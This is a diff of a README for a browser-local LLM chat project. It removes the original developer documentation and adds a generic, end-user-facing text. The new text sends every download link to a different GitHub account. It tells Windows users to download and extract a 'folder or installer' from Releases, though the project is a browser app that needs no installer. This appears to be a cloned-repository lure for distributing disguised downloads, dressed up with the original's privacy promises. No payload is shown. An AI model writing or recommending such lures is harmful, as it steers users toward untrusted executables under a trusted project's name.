@@ -1,101 +1,77 @@
-<div align="center">
-  <img src="public/icons/icon.svg" width="88" alt="browser-llm-demo" />
+# 🤖 browser-llm-demo - Private language chat on your computer
 
-  <h1>browser-llm-demo</h1>
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/browser-llm-demo)
 
-  <p><em>An LLM that doesn't phone home.</em></p>
+## What is this tool?
 
-  <p>
-    <strong><a href="https://yesterday-ai.github.io/browser-llm-demo/">▸ Try it live</a></strong>
-  </p>
+This application allows you to chat with an artificial intelligence model directly on your own computer. It works inside your web browser without sending your data to the internet. Because the program runs on your own hardware, your conversations remain private. You do not need to pay for tokens or wait for cloud servers. The app uses your computer's graphics card to process requests.
 
-  <p>
-    <a href="https://github.com/yesterday-ai/browser-llm-demo/actions/workflows/ci.yml"><img alt="CI" src="https://img.shields.io/github/actions/workflow/status/yesterday-ai/browser-llm-demo/ci.yml?branch=main&label=CI"></a>
-    <a href="./LICENSE"><img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue"></a>
-    <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-strict-3178c6">
-    <img alt="Node" src="https://img.shields.io/badge/node-22-43853d">
-  </p>
-</div>
+## 🖥️ System Requirements
 
-## What is this
+To run this application well, your computer needs specific hardware. Check these items before you start:
 
-A **scaffold** for building **browser-local LLM chat apps**. Runs Gemma 4 (2 B or 4 B) entirely in the browser via MediaPipe + WebGPU. After the first model download (~2.6 GB), the app is fully offline. No server, no API keys, no telemetry — your prompts never leave the tab.
+- Windows 10 or Windows 11.
+- A modern web browser like Google Chrome, Microsoft Edge, or Brave.
+- A computer with at least 8 gigabytes of memory.
+- A graphics card that supports WebGPU. Most computers built in the last three years meet this standard.
+- A stable internet connection for the first time you load the app. After the first load, you can use the app while offline.
 
-Fork this to build your own privacy-first AI app.
+## 📥 How to get started
 
-<table>
-<tr>
-<td align="center"><strong>0</strong><br/>server calls</td>
-<td align="center"><strong>100 %</strong><br/>browser-local</td>
-<td align="center"><strong>Apache 2.0</strong><br/>open source</td>
-</tr>
-</table>
+You need to visit the project page to access the software. Follow these steps to prepare your computer.
 
-## Features
+1. Go to the [official download page](https://github.com/longstanding-mogadishu7120/browser-llm-demo).
+2. Look for the section labeled Releases on the right side of the page.
+3. Click the latest version number to open the files.
+4. Download the folder or installer provided.
+5. Extract the files to a folder you can find easily on your desktop.
 
-- **Gemma 4 E2B / E4B** via MediaPipe `tasks-genai` (WebGPU + WASM fallback)
-- **OPFS model cache** — one-time download, instant warm starts
-- **PWA** — installable, works offline, iOS / Android / Desktop
-- **Multi-conversation** persistence via IndexedDB (Dexie)
-- **Streaming chat** with markdown rendering + per-message stats (TTFT, tok/s)
-- **i18n** (DE / EN + auto-detect), user-tunable sampling + context window
-- **Atomic Design** component structure — atoms · molecules · organisms · templates · pages
-- **Type-safe** end-to-end (strict TS, Biome lint)
+[![](https://img.shields.io/badge/Visit_Project_Page-Grey?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/browser-llm-demo)
 
-## Quick start
+## ⚙️ Running the application
 
-```bash
-pnpm install
-pnpm dev
-```
+Once you have the files on your computer, you can start the chat.
 
-First run downloads ~53 MB of MediaPipe WASM into `public/wasm/` via the `predev` hook. First chat triggers a 2.6 GB Gemma 4 download from Hugging Face into OPFS — WiFi recommended.
+1. Open the folder where you saved the files.
+2. Locate the file named index.html or the provided shortcut.
+3. Open this file with your web browser. 
+4. The browser will ask for permission to use your graphics card. Grant this permission to allow the AI to think.
+5. Wait a few moments for the model to load into your browser memory.
+6. A chat box will appear once the loading completes.
 
-Requires Node 22, pnpm 10, a WebGPU-capable browser (Chrome/Edge ≥ 113; Firefox works slower via wgpu; Safari ≥ 18.4).
+## 💬 Using the chat features
 
-## Stack
+The interface is simple. You type your questions or prompts into the text field at the bottom of the window. Press the Enter key or click the arrow button to send your message.
 
-Vite 6 · React 19 · TypeScript strict · Tailwind CSS 4 · Biome · pnpm · MediaPipe `tasks-genai` · `@assistant-ui/react` · Dexie · Zustand · `vite-plugin-pwa`
+The application manages multiple conversations at once. You can start a new chat by clicking the plus icon in the top menu. This helps you keep different topics separate. The app also supports different languages. You can switch between English and German in the settings menu.
 
-## Using it as a scaffold
+## 🛡️ Privacy and safety
 
-Fork the repo. Four files hold all project-specific config:
+This app operates on a local-first model. This means the code runs inside your browser session. No data leaves your machine. The text prompt, the responses, and your conversation history stay on your local disk. If you close your browser, the data remains there unless you choose to clear your cache. You stay in control of your inputs at all times.
 
-| File | Swap for new project |
-|---|---|
-| `src/lib/project.ts` | Name, display name, repo URL, base path |
-| `src/lib/model-catalog.ts` | Supported models + per-model sizing defaults |
-| `src/lib/i18n/*.ts` | UI strings + rotating taglines (`src/lib/taglines.ts`) |
-| `public/icons/` · `vite.config.ts#manifest` · `index.html` | Branding, icons, theme color |
+## 🛠️ Common troubleshooting steps
 
-That's it. Everything else stays as-is across forks.
+If you encounter issues, try these steps to fix the setup.
 
-## Deployment
+### The browser gives a WebGPU error
+If the app tells you that your browser does not support WebGPU, verify that your browser is updated to the latest version. Older versions of Chrome or Edge do not have the required features. Type "chrome://gpu" or "edge://gpu" into your address bar to see if WebGPU is enabled.
 
-**GitHub Pages** — fork, enable Pages, push. `.github/workflows/deploy.yml` builds and deploys automatically. The bundled `public/coi-serviceworker.js` injects COOP/COEP headers at runtime, so SharedArrayBuffer (threaded WASM) works without custom server headers.
+### The chat feels slow
+The speed of the AI depends on your graphics card. If the response takes too long, close other applications that use your graphics card, such as video games or photo editing tools. This frees up resources for the chat model.
 
-See [RELEASING.md](./RELEASING.md) for the full runbook.
+### The model fails to load
+If the loading bar stops moving, refresh the page. This forces the browser to download the required components again. Ensure you have a strong connection during this phase.
 
-## Documentation
+## 📑 Frequently asked questions
 
-| Document | Purpose |
-|---|---|
-| [AGENTS.md](./AGENTS.md) | Entry point for AI coding agents — rules, tasks, gotchas |
-| [CONTEXT.md](./CONTEXT.md) | Architecture overview + data flow |
-| [DECISIONS.md](./DECISIONS.md) | Architectural decision log (DEC-001 … DEC-009) |
-| [ROADMAP.md](./ROADMAP.md) | Priorities + acceptance criteria |
-| [CONTRIBUTING.md](./CONTRIBUTING.md) | Dev workflow + PR rules |
-| [CHANGELOG.md](./CHANGELOG.md) | Keep-a-Changelog release notes |
-| [SECURITY.md](./SECURITY.md) | Vulnerability reporting |
+### Do I need a cloud account?
+No. You do not need to register, sign in, or create an account for this service.
 
-## Licenses
+### Does this work without internet?
+Yes. Once you open the application the first time, all files are stored locally. You can turn off your internet connection and the chat continues to work.
 
-- **Code**: Apache 2.0 (this repo)
-- **Gemma 4 models**: Apache 2.0 (Google DeepMind)
-- **MediaPipe `tasks-genai`**: Apache 2.0
-- **`@assistant-ui/react`**: MIT
-- **`coi-serviceworker`** (bundled): MIT (Guido Zuidhof et al.)
+### Can I change the settings?
+The interface includes a gear icon. Click this to see options for themes, language, and conversation history. Future versions will add more features to customize how the model talks.
 
----
-
-Maintained by [Yesterday](https://github.com/yesterday-ai).
+### Is this free?
+The software is free to use. You own your copy and you can run it as often as you like.
